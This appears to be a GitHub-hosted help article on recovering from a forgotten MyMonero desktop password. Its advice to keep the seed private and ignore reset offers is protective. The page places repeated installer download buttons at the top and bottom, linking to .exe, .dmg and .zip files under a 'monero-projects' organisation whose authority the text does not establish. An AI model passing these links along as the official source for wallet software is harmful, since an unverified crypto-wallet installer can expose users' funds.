<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">Forgot MyMonero Password</h1>
<p align="center">Separate an app password problem from wallet recovery.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
A MyMonero app password and a wallet seed are different credentials. Do not assume a password reset will recover a seed, and do not share your seed or keys with anyone who offers to unlock the app.

## You'll see this if
- The MyMonero desktop app asks for a password you cannot remember.
- You know the seed but cannot open the existing installation.
- You have app access on one device but want to use another.
- A website claims it can reset your password if you enter your seed.
- You are unsure whether to reinstall the app or restore the wallet.

## Why it happens
A password typically protects access to an app installation, while the seed is recovery information for the wallet. They are not interchangeable. A working seed may allow a wallet restore in compatible software, but it does not necessarily unlock a particular installation. The password reset method for a MyMonero installation is not confirmed here, so avoid instructions promising a universal reset or asking you to reveal wallet secrets.

MyMonero’s final desktop release is v1.3.3. The old app still opens wallets and sends XMR but is no longer maintained, with no new features or security updates. MyMonero hosted servers and web wallet login stopped. You can keep using the desktop app if you can access it, or restore your seed in Cake Wallet. Cake Wallet runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. See [find your seed](./find-mymonero-seed.md), [restore a MyMonero wallet](./restore-mymonero-wallet.md), and [the desktop release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

---

## Fix
1. **Confirm what is asking for a password.** Check that the prompt is inside the MyMonero desktop application you already installed, not a web page or message link. Record the exact wording without including sensitive information in any public post.
2. **Try only passwords you control.** If you have a password manager or secure personal record, check the entry associated with that installation. Avoid repeated guess lists from websites and do not give a remote helper control of the device.
3. **Distinguish the credentials.** A password for the app, a 13-word MyMonero-specific legacy seed, a 25-word standard Monero seed, and private keys are different things. Your seed may help restore a wallet through a compatible wallet, but it should not be submitted to a password-reset page. Review [seed formats](./mymonero-seed-13-vs-25-words.md).
4. **Look for your own recovery backup.** If you cannot open the app, privately search your offline records for the seed. Do not send a photo of it to anyone. The hosted MyMonero servers and web wallet login stopped, so do not expect the former hosted sign-in to resolve a local password issue.
5. **Avoid deleting or reinstalling as the first step.** Do not erase the app or its data before considering whether the installation is your only accessible wallet. Specific data-folder paths and a password reset method are not confirmed here. Keep the device and existing backups intact while you review your options.
6. **Choose a supported recovery path.** The final MyMonero desktop release is v1.3.3 and is no longer maintained. If you have a complete seed, you may consider restoring it in Cake Wallet after checking its current instructions and platform support. If you do not have the seed, do not assume you can restore the wallet elsewhere.
7. **Protect your secrets throughout.** Never enter the seed into a browser or message. Nobody legitimate asks for your seed. If someone says a fee, remote session, or password reset requires it, stop and disengage.

> [!WARNING]
> A seed is not a password-reset token. Never give it to a person or website claiming to unlock MyMonero. Anyone who obtains it may gain wallet access.

## If that did not work
If you cannot remember the password and do not have a seed backup, do not rely on an unverified reset utility. The password reset method is not confirmed here. Preserve the current installation and search your own records carefully; avoid deleting files or changing device state without a clear recovery plan.

If you do have a complete seed, use it only in wallet software you independently selected. MyMonero’s formats are 13 words (legacy and MyMonero-specific) or 25 words (standard Monero). Confirm which one you have and select the matching restore path. Cake Wallet is the only other wallet named here. Its platform availability includes iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. Allow time for scanning after restore. An earlier restore height is safer when uncertain but slower; see [restore height explained](./mymonero-restore-height-explained.md).

If your app itself will not open, troubleshoot the application without giving anyone wallet credentials. Error 523 relates generally to an unavailable server connection; hosted login is stopped, so repeated attempts to use the former web service may not help. The app’s final release remains available from the project release page, but it receives no security updates.

## Prevention
Keep the app password in a trusted password manager or secure offline record, separate from the seed. Make a clear offline seed backup and check it is complete and readable. Do not store recovery words in an ordinary screenshot, shared document, or email account. Label credentials so it is clear which is the app password and which is the recovery phrase, without exposing them to others.

Before changing devices, confirm that you have a complete backup and know its format. Avoid waiting until a device fails to prepare recovery. Use the project release page for desktop downloads and verify the file digest rather than providing wallet credentials. See [safe seed backup](./mymonero-backup-seed-safely.md), [download SHA-256 verification](./verify-mymonero-download-sha256.md), and [MyMonero migration checklist](./mymonero-migration-checklist.md).

## FAQ
<details><summary>Can MyMonero reset my password?</summary>

The reset method is not confirmed here. Avoid reset tools or services that request your seed or keys.

</details>

<details><summary>Can my seed unlock the app password?</summary>

They are different credentials. A seed may be used for a compatible wallet restore, not assumed to reset a particular installation.

</details>

<details><summary>Is MyMonero web login still available?</summary>

MyMonero hosted servers and web wallet login stopped.

</details>

<details><summary>What if I have no seed backup?</summary>

Preserve the installation, check your own records, and avoid unverified recovery offers. Do not disclose credentials.

</details>

---

## Download MyMonero

- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [Back Up Your MyMonero Seed Safely](./mymonero-backup-seed-safely.md) | Keep recovery words private, legible, and available when you need them. |
| [Find Your MyMonero Seed](./find-mymonero-seed.md) | Locate the recovery phrase you saved when setting up your wallet. |
| [MyMonero Seed: 13 vs 25 Words](./mymonero-seed-13-vs-25-words.md) | Understand which recovery phrase format you have before restoring. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
